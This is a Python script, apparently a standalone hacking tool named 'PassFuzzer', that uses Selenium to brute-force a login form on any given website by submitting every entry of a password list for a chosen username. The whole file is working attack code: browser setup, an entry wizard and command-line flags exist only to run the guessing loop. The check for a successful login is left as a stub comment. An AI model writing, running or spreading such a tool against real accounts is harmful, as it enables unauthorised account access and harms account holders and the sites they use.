import sys
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, WebDriverException
import argparse

class color:
    GREEN = '\033[92m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    BOLD = '\033[1m'
    END = '\033[0m'
    WHITE = '\033[37m'

banner = f"""{color.BOLD}{color.YELLOW}
 ######                           #######                                         
 #     #    ##     ####    ####   #        #    #  ######  ######  ######  #####  
 #     #   #  #   #       #       #        #    #      #       #   #       #    # 
 ######   #    #   ####    ####   #####    #    #     #       #    #####   #    # 
 #        ######       #       #  #        #    #    #       #     #       #####  
 #        #    #  #    #  #    #  #        #    #   #       #      #       #   #  
 #        #    #   ####    ####   #         ####   ######  ######  ######  #    # 

{color.CYAN}Password Brute-force tool
{color.CYAN}Version 1.0
{color.CYAN}Author: Sparky99
{color.END}
"""

def check_website(url):
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            print(f'{color.GREEN}[OK] {color.WHITE}')
            return True
        else:
            print(f'{color.RED}[X] {color.WHITE}Site returned status {resp.status_code}')
            return False
    except requests.exceptions.RequestException as e:
        print(f'{color.RED}[X] {color.WHITE}Error: {e}')
        return False

def get_browser_driver(browser, driver_path):
    """Return a Selenium WebDriver instance for the specified browser."""
    browser = browser.lower()
    if browser == "edge":
        from selenium.webdriver.edge.service import Service as EdgeService
        options = webdriver.EdgeOptions()
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        service = EdgeService(driver_path)
        return webdriver.Edge(service=service, options=options)
    elif browser == "chrome":
        from selenium.webdriver.chrome.service import Service as ChromeService
        options = webdriver.ChromeOptions()
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        service = ChromeService(driver_path)
        return webdriver.Chrome(service=service, options=options)
    elif browser == "firefox":
        from selenium.webdriver.firefox.service import Service as FirefoxService
        options = webdriver.FirefoxOptions()
        service = FirefoxService(driver_path)
        return webdriver.Firefox(service=service, options=options)
    else:
        print(f"{color.RED}Unsupported browser: {browser}{color.END}")
        sys.exit(1)

def brutes(uName, unameStr, passStr, lBtnStr, passList, website, driver_path, browser):
    try:
        browser_driver = get_browser_driver(browser, driver_path)
    except WebDriverException as e:
        print(f'{color.RED}Webdriver error: {e}{color.END}')
        sys.exit(1)
    browser_driver.get(website)
    with open(passList, 'r', encoding='utf-8', errors='ignore') as passFile:
        for password in passFile:
            password = password.strip()
            try:
                user_elem = browser_driver.find_element(By.NAME, unameStr)
                pass_elem = browser_driver.find_element(By.NAME, passStr)
                btn_elem = browser_driver.find_element(By.NAME, lBtnStr)
                user_elem.clear()
                pass_elem.clear()
                user_elem.send_keys(uName)
                pass_elem.send_keys(password)
                btn_elem.click()
                print(f'{color.CYAN}Tried: {color.WHITE}{password}')
                # Add logic here to check if login was successful
            except NoSuchElementException:
                print(f'{color.RED}Element not found. Check your selectors.{color.END}')
                break
            except KeyboardInterrupt:
                print(f'{color.RED}[#] {color.WHITE}Exited upon user request...{color.END}')
                browser_driver.quit()
                sys.exit(0)
    browser_driver.quit()

def wizard():
    print(banner)
    website = input(f'{color.GREEN}[~] {color.WHITE}Enter a website: ')
    if not check_website(website):
        sys.exit(1)
    userStr = input(f'{color.GREEN}[~] {color.WHITE}Enter the username selector: ')
    passStr = input(f'{color.GREEN}[~] {color.WHITE}Enter the password selector: ')
    lBtnStr = input(f'{color.GREEN}[~] {color.WHITE}Enter the Login button selector: ')
    user = input(f'{color.GREEN}[~] {color.WHITE}Enter the username to brute-force: ')
    passList = input(f'{color.GREEN}[~] {color.WHITE}Enter a directory to a password list: ')
    driver_path = input(f'{color.GREEN}[~] {color.WHITE}Enter the path to your WebDriver: ')
    browser = input(f'{color.GREEN}[~] {color.WHITE}Enter browser (edge/chrome/firefox): ')
    brutes(user, userStr, passStr, lBtnStr, passList, website, driver_path, browser)

def main():
    parser = argparse.ArgumentParser(description='Password Brute-force tool')
    parser.add_argument('-l', '--username', help='Username to brute-force')
    parser.add_argument('-u', '--usernamesel', help='Username selector')
    parser.add_argument('-p', '--passsel', help='Password selector')
    parser.add_argument('-b', '--loginsel', help='Login button selector')
    parser.add_argument('-P', '--passlist', help='Password list file')
    parser.add_argument('-w', '--website', help='Target website')
    parser.add_argument('-d', '--driver', help='Path to browser WebDriver')
    parser.add_argument('-B', '--browser', help='Browser to use (edge/chrome/firefox)')
    args = parser.parse_args()

    required = ['username', 'usernamesel', 'passsel', 'loginsel', 'passlist', 'website', 'driver', 'browser']
    if all(getattr(args, arg) is None for arg in required):
        try:
            wizard()
        except KeyboardInterrupt:
            print(f'{color.RED}[#] {color.WHITE}Exited upon user request...{color.END}')
            sys.exit(0)
    else:
        missing = [arg for arg in required if getattr(args, arg) is None]
        if missing:
            print(f'{color.RED}Missing arguments: {", ".join(missing)}{color.END}')
            parser.print_help()
            sys.exit(1)
        print(banner)
        brutes(
            args.username,
            args.usernamesel,
            args.passsel,
            args.loginsel,
            args.passlist,
            args.website,
            args.driver,
            args.browser
        )

if __name__ == '__main__':
    main()
